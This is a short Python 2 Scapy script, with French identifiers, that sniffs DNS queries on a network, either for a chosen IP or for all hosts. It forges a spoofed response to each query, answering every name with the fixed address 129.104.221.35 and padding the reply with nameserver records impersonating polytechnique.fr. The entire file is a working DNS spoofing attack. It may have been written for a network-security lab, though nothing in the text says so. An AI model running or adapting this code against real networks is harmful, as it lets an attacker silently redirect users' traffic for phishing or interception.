from scapy.all import *

class entier:
    def __init__(self):
        self.val = 0
    def inc(self):
        self.val += 1
i = entier()

def maFonction(a):
    i.inc()
    msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
    if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
        msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
        print msg
        spoofed_pkt = Ether(dst=a[Ether].src,src=a[Ether].dst)/\
                      IP(dst=a[IP].src, src=a[IP].dst, id=63290)/\
                      UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
                      DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 0L, qr=1L, ra = 1L,\
                      an = DNSRR(rrname=a[DNS].qd.qname,type='A',rclass='IN', ttl=23942, rdata='129.104.221.35'),\
                      ns = DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "rackham.polytechnique.fr")/\
                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "picaros.polytechnique.fr")/\
                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "milou.polytechnique.fr")/\
                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "ns2.nic.fr"),\
                      ar = DNSRR(rrname = "ns2.nic.fr", type = "A", ttl = 105036, rdata = '192.93.0.4')/\
                      DNSRR(rrname = "ns2.nic.fr", type = "AAAA", ttl = 134430, rdata = '2001:660:3005:1::1:2')/\
                      DNSRR(rrname = "milou.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.30.41')/\
                      DNSRR(rrname = "milou.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026:1:0:30:30:41')/\
                      DNSRR(rrname = "picaros.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.7.41')/\
                      DNSRR(rrname = "picaros.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026::7:7:41')/\
                      DNSRR(rrname = "rackham.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.32.41')/\
                      DNSRR(rrname = "rackham.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026::32:32:41')/\
                      DNSRR(rrname='.',type=41,rclass=4096,ttl=0,rdata=''))
        sendp(spoofed_pkt)

    if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')) and (a[DNS].ancount>0):
        if (a[DNS].ancount == 0):
            msg = msg + ' <--- ANSWER: empty '
        else:
            msg = msg + ' <-- ANSWER: ' + a[DNS].an[0].rdata
        print msg

        
def monFiltre(x):
    return (x.haslayer(DNS)) and (x.haslayer(UDP))
    

filtre = sys.argv[1]
sniff(count = 1000,lfilter = monFiltre,prn = maFonction)
